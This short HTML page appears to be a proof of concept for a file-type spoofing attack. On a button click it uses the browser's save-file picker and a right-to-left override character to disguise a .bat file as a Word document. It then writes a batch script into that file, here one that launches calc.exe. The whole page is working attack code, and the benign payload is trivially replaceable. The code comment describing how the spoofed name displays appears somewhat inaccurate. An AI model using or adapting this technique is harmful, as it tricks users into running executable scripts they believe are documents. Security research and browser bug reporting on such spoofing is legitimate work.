<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Word Icon Spoof - No History</title>
</head>
<body>
  <h3>Save as Word Document - Actually a BAT</h3>
  <button id="save">Save File</button>

  <script>
    document.getElementById('save').addEventListener('click', async () => {
      // Reversing "doc" using RTLO, and adding real extension .bat
      const spoofedName = 'report\u202e cod.bat'; // displays as report.bat.doc

      const options = {
        suggestedName: spoofedName,
        types: [{
          description: 'Microsoft Word Document',
          accept: {
            'application/x-msdownload': ['.bat']
          }
        }]
      };

      try {
        const handle = await window.showSaveFilePicker(options);
        const writable = await handle.createWritable();
        await writable.write(`@echo off\r\nstart calc.exe`);
        await writable.close();
        alert('Saved as fake Word document!');
      } catch (err) {
        console.error(err);
        alert('Cancelled');
      }
    });
  </script>
</body>
</html>
